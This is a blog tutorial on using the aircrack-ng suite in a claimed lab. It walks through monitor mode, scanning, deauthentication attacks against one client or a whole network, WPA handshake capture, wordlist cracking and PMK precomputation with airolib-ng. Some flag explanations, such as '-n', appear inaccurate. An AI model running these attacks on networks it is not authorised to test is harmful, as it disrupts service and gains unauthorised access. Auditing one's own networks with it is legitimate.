

## Introduction
This post was written together with Yoshy. Direct link to his website —> https://llo0zy.github.io/

In this post I'm going to tell you about the Aircrack-ng tool, as well as some of the tools that come with that same suite, and how to use them to obtain the password of a private network.

This post is made for educational purposes; I take no responsibility for the use that may be made of it.

(This whole post was done in a closed test environment, with the networks created for the test)

## Aircrack-ng
Official documentation: https://www.aircrack-ng.org/doku.php

Aircrack-ng is a wireless security software suite. It consists of a network packet analyzer, it recovers WEP and WPA/WPA2-PSK passwords, and it includes another set of wireless auditing tools.

### Installation
These are the two main ways to install the tool

### With the Linux package manager:
Debian

```
sudo apt install aircrack-ng
```

Fedora

```
sudo dnf install aircrack-ng
```

Arch

```
sudo pacman -Sy aircrack-ng
```

CentOS

```
sudo yum install epel-release
sudo yum install aircrack-ng
```
### From source:
For more information see this page: https://www.aircrack-ng.org/doku.php?id=install_aircrack

Linux / Windows

```
wget https://download.aircrack-ng.org/aircrack-ng-1.7.tar.gz
tar -zxvf aircrack-ng-1.7.tar.gz
cd aircrack-ng-1.7
autoreconf -i
./configure --with-experimental
make
make install
ldconfig
```

## Setting monitor mode
Monitor mode, on our network card, lets us intercept the packets moving across the network and the access points in the area

To put our network card into monitor mode we can use either of these two commands

```
sudo airmon-ng start wlan0
```

```
sudo iwconfig wlan0 mode monitor
```
If it worked correctly we would see something like this:

![1](</Writeups/Blogs/Wifi/img/2.png>)

If we want to get more information about the network card we'll use the iw command:

```
sudo iw dev wlan0 info
```

![1](</Writeups/Blogs/Wifi/img/3.png>)

To stop monitor mode we would first have to use this command

```
sudo airmon-ng stop wlan0
```

Afterwards we have to kill some processes that can conflict; to stop them we'll use this command

```
sudo pkill dhclient && pkill wpa_supplicant
```

```
sudo killall dhclient wpa_supplicant
```

```
sudo airmon-ng check kill
```

Now we have to restart the networking service

```
sudo /etc/init.d/networking restart
```

# Network analysis
### Using airodump-ng
To scan the access points available on the network with Airodump (this utility is part of the Aircrack suite)

```
sudo airodump-ng wlan0
```

![1](</Writeups/Blogs/Wifi/img/4.png>)

This is a table with the meaning of each section, each column of the output the command gives us:

![1](</Writeups/Blogs/Wifi/img/11.png>)

With this tool we can filter the information, to keep only what we're interested in

This would be the way to filter by channel

```
sudo airodump-ng -c 6 wlan0
```

This is how we'd filter by ESSID

```
sudo airodump-ng --essid LAB-AP-1 wlan0
```

And the same by BSSID

```
sudo airodump-ng --bssid AA:BB:CC:00:11:11 wlan0
```

To save the information obtained from the network packet capture, we'll use the -w parameter:

```
sudo airodump-ng -w lol wlan0
```

This will create 5 file formats for us: .cap, .csv, .kismet.csv, .kismet.netxml, .log.csv

![1](</Writeups/Blogs/Wifi/img/5.png>)

### Using airgraph-ng
With this tool we can graph all the information we've obtained from the network

![1](</Writeups/Blogs/Wifi/img/6.png>)

For this we'll need the .csv file and to run the following command line:

- Client to Access point Relationship Graph -> -g CAPR
- Client to Probe Request Graph -> -g CPG

```
airgraph-ng -i capture-01.csv -o demo.png -g CAPR
```

Something that stands out is the green color we have in the capture; we can have one or several routers in the capture, and they will have different colors, here's the list with their meanings:

- Green -> WAP networks
- Yellow -> WEP networks
- Red -> OPN networks
- Black -> Unrecognized networks

## Deauthentication

Now that we have a clear picture of all the hosts and access points on the network, we're going to try to get the password of one of them; for this we're going to identify the network we want to attack.

Once we know the network we're going to identify the hosts that are connected to it

Now the process we're going to follow is to kick that host off the network, so that when it automatically reconnects to its network we'll capture the connection handshake, to later crack it with brute force and obtain the password

To kick the host off its network we'll run a deauthentication attack; we can do it in two ways:

### Targeted deauthentication attack

First we have to analyze our network, looking for a possible victim

```
sudo airodump-ng --bssid AA:BB:CC:00:22:22 wlan0
```

Then, with the previous command running in the background, we'll perform the deauthentication

- The -a is the MAC of the access point
- The -e is the essid of the access point
- The -c is the MAC of the victim host

```
aireplay-ng -0 0 -a AA:BB:CC:00:22:22 -e LAB-AP-2 -c AA:BB:CC:00:33:33 wlan0
```

### Global deauthentication attack

First we do the same as before, and analyze the network

```
sudo airodump-ng -c 6 --bssid AA:BB:CC:00:22:22 wlan0
```

Now we can run a deauthentication attack against the whole network; for this we'll use this command

```
aireplay-ng -0 0 -a AA:BB:CC:00:22:22 -e LAB-AP-2 -c FF:FF:FF:FF:FF:FF wlan0
```

## Capturing the handshake

Once we've successfully carried out the deauthentication attack, we'll confirm it with the message Airodump-ng gives us in the network capture

![1](</Writeups/Blogs/Wifi/img/7.png>)

Now that we've confirmed we have the handshake, we can stop the capture and make use of the .cap file it will have created if we used the -w parameter

![1](</Writeups/Blogs/Wifi/img/8.png>)

## Cracking the hash

Normally attackers use the aircrack-ng command to run trial-and-error (bruteforcing) attacks against the handshake; to do that we use the command:

```
sudo aircrack-ng -n lol.pcap -w wordlist.lst
```

Where -n is the network packets containing the handshake, and -w the password list.

The problem comes when there are 10 million passwords to try, which could end up taking more than a week of testing. But here I bring you the solution known as rainbow tables, which is converting all those passwords into hashes so that reading and writing them is faster, thus optimizing the cracking of the hash as much as possible.

Here's a short guide…

To use the tool we have to create a file with the name of the ESSID:

```
echo tplink > essid.txt
```

And then create a database with airolib-ng:

```
airolib-ng tplink.sqlite --import essid essid.txt
```

![1](</Writeups/Blogs/Wifi/img/9.png>)

With the command: airolib-ng tplink.sqlite –stats we can see information about the database:

```
There are 1 ESSIDs and 0 passwords in the database. 0 out of 0 possible combinations have been computed (0%).

ESSID	Priority	Done
TP-Link_73A8	64	(null)
```

Now we'll load the possible passwords into our database with:

```
airolib-ng tplink.sqlite --import passwd ./dict.lst
```

![1](</Writeups/Blogs/Wifi/img/10.png>)

Now we're going to generate the result of the combination between the password and the essid; for this we'll use the –batch parameter:

```
$ airolib-ng tplink.sqlite --batch

Batch processing ...
Computed 5000 PMK in 11 seconds (454 PMK/s, 121985 in buffer)
```

Then it's used in aircrack-ng with the parameter: -n

Thanks for reading this post all the way to the end, I hope you've learned something new ;)